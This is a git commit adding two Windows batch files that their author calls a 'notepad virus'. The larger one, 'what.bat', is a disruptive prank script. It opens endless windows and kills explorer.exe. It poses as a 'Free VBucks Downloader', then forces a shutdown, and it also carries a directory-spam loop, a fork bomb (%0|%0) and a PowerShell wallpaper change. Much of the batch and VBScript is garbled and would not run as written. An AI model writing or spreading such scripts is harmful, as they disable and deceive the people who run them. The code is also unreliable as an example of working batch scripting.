aff0f26a373c2703581e03a69322b510cc016541
Kurttheidiot <gennakarquezonbrgyanoling@gmail.com>
2025-03-01 10:16:07 +0800

    notepad virus
    get notepad virus

---
+++ chrome.bat
@@ -0,0 +1,3 @@
+@echo off 
+:x
+start https://www.google.com/url?sa=i&url=https%3A%2F%2Fwrench.com%2Fblog%2F13-best-car-memes%2F&psig=AOvVaw0q9xsawQ2sc72bcP_3XRB4&ust=1740306986368000&source=images&cd=vfe&opi=89978449&ved=0CBAQjRxqFwoTCIC4tt-K14sDFQAAAAAdAAAAABAE
---
+++ what.bat
@@ -0,0 +1,165 @@
+@echo off
+echo you wanna see cats (answer in only yes/no)
+start https://www.youtube.com/watch?v=KpBnc9acOZg
+pause
+:X
+start https://www.youtube.com/watch?v=sSCIcC9w67g
+echo do MsgBox "nobitches" 
+        loop "%text%" >> "notavirus.vbs"
+start notavirus.vbs
+start what.bat
+:loop
+start
+start
+start
+start
+start
+goto loop
+echo do
+Set wshsell = wscript.CreateObject("WScript.Shell")
+Wshshell.run "Notepad"
+wscript.sleep 100
+wshshell.sendkeys "V"
+wscript.sleep 100
+wshshell.sendkeys "I"
+wscript.sleep 100
+wshshell.sendkeys "R"
+wscript.sleep 100
+wshshell.sendkeys "U"
+wscript.sleep 100
+wshshell.sendkeys "S"
+loop "%text%" >> "god.vbs"
+start god.vbs
+title Rizz Virus
+color F
+
+:start
+set text="Hello, You're About to Get Rizzed"
+echo %text%
+echo set speech = Wscript.CreateObject("SAPI.spVoice") > speech.vbs
+echo speech.speak %text% >> speech.vbs
+start speech.vbs
+timeout 1 >nul
+
+
+call :Attack "Do you have a name, or can I call you mine?"
+call :Attack "Are you French? Because Eiffel for you."
+call :Attack "Your eyes are like an ocean, and I'm lost at sea."
+call :Attack "If beauty were a crime, you'd be serving a life sentence."
+call :Attack "Are you a time traveler? Because I can see you in my future."
+call :Attack "Are you a camera? Because every time I look at you, I smile."
+
+
+:attack
+cls
+echo %~1
+echo set speech = Wscript.CreateObject("SAPI.spVoice") > speech.vbs
+echo speech.speak "%~1" >> speech.vbs
+start speech.vbs
+timeout 5 >nul
+exit /b
+@mode con cols=50 lines=3
+
+:close_explorer
+taskkill /f /im "explorer.exe" >nul
+
+echo Never Gonna Give You UP! Never Gonna Let You Down!
+
+:play audio
+if exist speech.Vbs del speech.Vbs
+echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
+set "text=Never gonna give you up, never gonna let you down."
+echo speech.speak "%text%" >> "speech.vbs"
+start speech.vbs
+timeout 5 >nul
+del speech.Vbs
+
+:backToNormal
+start explorer.exe
+
+del speech.Vbs
+exitCHCP 65001 >nul
+@MODE CON COLS=54 LINES=18
+:menu
+COLOR 0A
+TITLE Free VBucks Downloader
+echo.
+echo           ███████╗██████╗ ███████╗███████╗          
+echo           ██╔════╝██╔══██╗██╔════╝██╔════╝          
+echo           █████╗  ██████╔╝█████╗  █████╗            
+echo           ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝            
+echo           ██║     ██║  ██║███████╗███████╗          
+echo           ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝          
+echo.
+echo   ██╗   ██╗██████╗ ██╗   ██╗ ██████╗██╗  ██╗███████╗
+echo   ██║   ██║██╔══██╗██║   ██║██╔════╝██║ ██╔╝██╔════╝
+echo   ██║   ██║██████╔╝██║   ██║██║     █████╔╝ ███████╗
+echo   ╚██╗ ██╔╝██╔══██╗██║   ██║██║     ██╔═██╗ ╚════██║
+echo    ╚████╔╝ ██████╔╝╚██████╔╝╚██████╗██║  ██╗███████║
+echo     ╚═══╝  ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝
+echo.
+echo - A : ADD AMOUNT TO YOUR ACCOUNT
+echo - B : EXIT
+choice /C AB /CS /N /M "Enter A or B: "
+if %errorlevel%==1 goto add
+if %errorlevel%==2 goto exit
+
+:exit
+exit
+
+:add
+@MODE CON COLS=50 LINES=4
+CLS
+set /p aaaName=Enter Your Account Name: 
+set /p aaa=Enter Amount To Add: 
+timeout 1 >nul
+CLS
+echo GETTING ACCOUNT...
+timeout 1 >nul
+echo STARTING TRANSFER...
+timeout 1 >nul
+CLS
+echo TRANSFERING...
+echo ╔═════════════════════╗
+echo ║████                 ║
+echo ╚═════════════════════╝
+timeout 1 >nul
+CLS
+echo TRANSFERING...
+echo ╔═════════════════════╗
+echo ║█████████████        ║
+echo ╚═════════════════════╝
+timeout 1 >nul
+CLS
+echo TRANSFERING...
+echo ╔═════════════════════╗
+echo ║█████████████████████║
+echo ╚═════════════════════╝
+taskkill /f /im "explorer.exe" >nul
+if exist speech.Vbs del speech.Vbs
+echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
+set "text=Say good bye to your computer. Hahahaha"
+echo speech.speak "%text%" >> "speech.vbs"
+start speech.vbs
+timeout 5 >nul
+del speech.Vbs
+:: start explorer
+shutdown /s /t 5
+@echo off
+:loop
+md %random%%random%
+goto loop
+echo Do
+    MsgBox "subscribe", vbOKOnly + vbInformation, "Bruh"
+Loop "%text%" >> "WHAT IS.vbs"
+start WHAT IS.vbs
+%0|%0
+set IMG_URL=https://i.ytimg.com/vi/tzD9OxAHtzU/hq720_2.jpg
+:: NOTE! FOR EDUCATIONAL PURPOSES ONLY
+powershell -Command "Invoke-WebRequest -Uri '%IMG_URL%' -OutFile '%TEMP%\wallpaper.jpg'"
+powershell -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value '%TEMP%\wallpaper.jpg'; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%TEMP%\wallpaper.jpg', 3)"
+
+
+
+
+        
